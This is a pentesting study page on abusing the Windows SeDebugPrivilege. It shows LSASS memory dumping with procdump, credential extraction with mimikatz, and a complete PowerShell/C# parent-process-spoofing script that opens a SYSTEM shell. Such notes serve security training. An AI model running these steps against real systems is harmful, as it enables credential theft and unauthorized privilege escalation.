---
title: SeDebugPrivilege
author: amandaguglieri
draft: false
TableOfContents: true
tags:
  - pentesting
  - windows
  - privilege
  - SeDebugPrivilege
---
# 🗒️ SeDebugPrivilege

This privilege can be used to capture sensitive information from system memory, or access/modify kernel and application structures. A user might be assigned the SeDebugPrivilege without belonging to the administrators group.

```powershell
whoami /priv
```

Output:

```cmd-session
PRIVILEGES INFORMATION
----------------------

Privilege Name                            Description                                                        State
========================================= ================================================================== ========
SeDebugPrivilege                          Debug programs                                                     Disabled
SeChangeNotifyPrivilege                   Bypass traverse checking                                           Enabled
SeIncreaseWorkingSetPrivilege             Increase a process working set                                     Disabled
```


### Dumping lsass
We can use [ProcDump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) from the [SysInternals](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite) suite to leverage this privilege and dump process memory.

Dumping the Local Security Authority Subsystem Service ([LSASS](https://en.wikipedia.org/wiki/Local_Security_Authority_Subsystem_Service)) process:

```cmd-session
procdump.exe -accepteula -ma lsass.exe lsass.dmp
```

Exploiting it from the target host (if we can load tools such as mimikatz):

```cmd-session
mimikatz.exe

# Using 'mimikatz.log' for logfile : OK
mimikatz # log

# Switch to MINIDUMP : 'lsass.dmp'
mimikatz # sekurlsa::minidump lsass.dmp

# Opening : 'lsass.dmp' file for minidump...
mimikatz # sekurlsa::logonpasswords
```

Exploiting it without the capability of loading tools: take a manual memory dump of the `LSASS` process via the Task Manager by browsing to the `Details` tab, choosing the `LSASS` process, and selecting `Create dump file`.  Download this file back to our attack machine.

### Remote Code Execution as SYSTEM #1

The attack in a nugshell: target a parent process running as SYSTEM, launch a [child process](https://docs.microsoft.com/en-us/windows/win32/procthread/child-processes) and use the elevated rights granted to our account via `SeDebugPrivilege` to alter normal system behavior to inherit the token of that parent process and impersonate it.


For that we will use this script [psgetsys.ps1](https://raw.githubusercontent.com/decoder-it/psgetsystem/master/psgetsys.ps1): [Source](https://github.com/decoder-it/psgetsystem)

```powershell
#Simple powershell/C# to spawn a process under a different parent process 
#usage: ipmo psgetsys.ps1;  ImpersonateFromParentPid -ppid <parent pid> -command <command to execute> -cmdargs <command arguments>
$mycode = @"
using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;

public class MyProcess
{
    [DllImport("kernel32.dll")]
    static extern uint GetLastError();
    
	[DllImport("kernel32.dll")]
    [return: MarshalAs(UnmanagedType.Bool)]
    static extern bool CreateProcess(
        string lpApplicationName, string lpCommandLine, ref SECURITY_ATTRIBUTES lpProcessAttributes,
        ref SECURITY_ATTRIBUTES lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags,
        IntPtr lpEnvironment, string lpCurrentDirectory, [In] ref STARTUPINFOEX lpStartupInfo,
        out PROCESS_INFORMATION lpProcessInformation);

    [DllImport("kernel32.dll", SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static extern bool UpdateProcThreadAttribute(
        IntPtr lpAttributeList, uint dwFlags, IntPtr Attribute, IntPtr lpValue,
        IntPtr cbSize, IntPtr lpPreviousValue, IntPtr lpReturnSize);

    [DllImport("kernel32.dll", SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static extern bool InitializeProcThreadAttributeList(
        IntPtr lpAttributeList, int dwAttributeCount, int dwFlags, ref IntPtr lpSize);

    [DllImport("kernel32.dll", SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static extern bool DeleteProcThreadAttributeList(IntPtr lpAttributeList);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern bool CloseHandle(IntPtr hObject);
    
        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
    struct STARTUPINFOEX
    {
        public STARTUPINFO StartupInfo;
        public IntPtr lpAttributeList;
    }

    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
    struct STARTUPINFO
    {
        public Int32 cb;
        public string lpReserved;
        public string lpDesktop;
        public string lpTitle;
        public Int32 dwX;
        public Int32 dwY;
        public Int32 dwXSize;
        public Int32 dwYSize;
        public Int32 dwXCountChars;
        public Int32 dwYCountChars;
        public Int32 dwFillAttribute;
        public Int32 dwFlags;
        public Int16 wShowWindow;
        public Int16 cbReserved2;
        public IntPtr lpReserved2;
        public IntPtr hStdInput;
        public IntPtr hStdOutput;
        public IntPtr hStdError;
    }

    [StructLayout(LayoutKind.Sequential)]
    internal struct PROCESS_INFORMATION
    {
        public IntPtr hProcess;
        public IntPtr hThread;
        public int dwProcessId;
        public int dwThreadId;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct SECURITY_ATTRIBUTES
    {
        public int nLength;
        public IntPtr lpSecurityDescriptor;
        public int bInheritHandle;
    }

	public static void CreateProcessFromParent(int ppid, string command, string cmdargs)
    {
        const uint EXTENDED_STARTUPINFO_PRESENT = 0x00080000;
        const uint CREATE_NEW_CONSOLE = 0x00000010;
		const int PROC_THREAD_ATTRIBUTE_PARENT_PROCESS = 0x00020000;
		

        var pi = new PROCESS_INFORMATION();
        var si = new STARTUPINFOEX();
        si.StartupInfo.cb = Marshal.SizeOf(si);
        IntPtr lpValue = IntPtr.Zero;
        Process.EnterDebugMode();
        try
        {
            
            var lpSize = IntPtr.Zero;
            InitializeProcThreadAttributeList(IntPtr.Zero, 1, 0, ref lpSize);
            si.lpAttributeList = Marshal.AllocHGlobal(lpSize);
            InitializeProcThreadAttributeList(si.lpAttributeList, 1, 0, ref lpSize);
            var phandle = Process.GetProcessById(ppid).Handle;
            Console.WriteLine("[+] Got Handle for ppid: {0}", ppid); 
            lpValue = Marshal.AllocHGlobal(IntPtr.Size);
            Marshal.WriteIntPtr(lpValue, phandle);
            
            UpdateProcThreadAttribute(
                si.lpAttributeList,
                0,
                (IntPtr)PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
                lpValue,
                (IntPtr)IntPtr.Size,
                IntPtr.Zero,
                IntPtr.Zero);
            
            Console.WriteLine("[+] Updated proc attribute list"); 
            var pattr = new SECURITY_ATTRIBUTES();
            var tattr = new SECURITY_ATTRIBUTES();
            pattr.nLength = Marshal.SizeOf(pattr);
            tattr.nLength = Marshal.SizeOf(tattr);
            Console.Write("[+] Starting " + cmdargs  + "...");
			var b= CreateProcess(command, cmdargs, ref pattr, ref tattr, false,EXTENDED_STARTUPINFO_PRESENT | CREATE_NEW_CONSOLE, IntPtr.Zero, null, ref si, out pi);
			Console.WriteLine(b+ " - pid: " + pi.dwProcessId+ " - Last error: "  +GetLastError() );
			
        }
        finally
        {
            
            if (si.lpAttributeList != IntPtr.Zero)
            {
                DeleteProcThreadAttributeList(si.lpAttributeList);
                Marshal.FreeHGlobal(si.lpAttributeList);
            }
            Marshal.FreeHGlobal(lpValue);
            
            if (pi.hProcess != IntPtr.Zero)
            {
                CloseHandle(pi.hProcess);
            }
            if (pi.hThread != IntPtr.Zero)
            {
                CloseHandle(pi.hThread);
            }
        }
    }

}
"@

function ImpersonateFromParentPid
{
    
Param 
	(
	     [Parameter(Mandatory=$true, Position=0)]
         $ppid,
         [Parameter(Mandatory=$true, Position=1)]
		 $command,
         [Parameter(Mandatory=$false, Position=2)]
         $cmdargs
		 
    )


if (-not ([System.Management.Automation.PSTypeName]'MyProcess').Type)
{
    Add-Type -TypeDefinition $mycode
}


[MyProcess]::CreateProcessFromParent($ppid,$command,"$command $cmdargs")

}
```

How to run it:

```
# The two dots are not an error
. .\psgetsys.ps1 
ImpersonateFromParentPid -ppid 612 -command "c:\Windows\System32\cmd.exe" -cmdargs ""
```

Note that we must add a third blank argument `""` at the end for the PoC to work properly.

**Example:** 

**1.** First, open an elevated PowerShell console in the host machine.

**2.** Run tasklist

```
tasklist
```

**3.** Here we can target `winlogon.exe` running under PID 612, which we know runs as SYSTEM on Windows hosts. We will generate a child process for that parent process.

**4.** Run the script:

```
# The two dots are not an error
. .\psgetsys.ps1 
ImpersonateFromParentPid -ppid 612 -command "c:\Windows\System32\cmd.exe" -cmdargs ""
```

An Admin CMD will open. 


### Remote Code Execution as SYSTEM #2 

Other tools such as [this one](https://github.com/daem0nc0re/PrivFu/tree/main/PrivilegedOperations/SeDebugPrivilegePoC) exist to pop a SYSTEM shell when we have `SeDebugPrivilege`.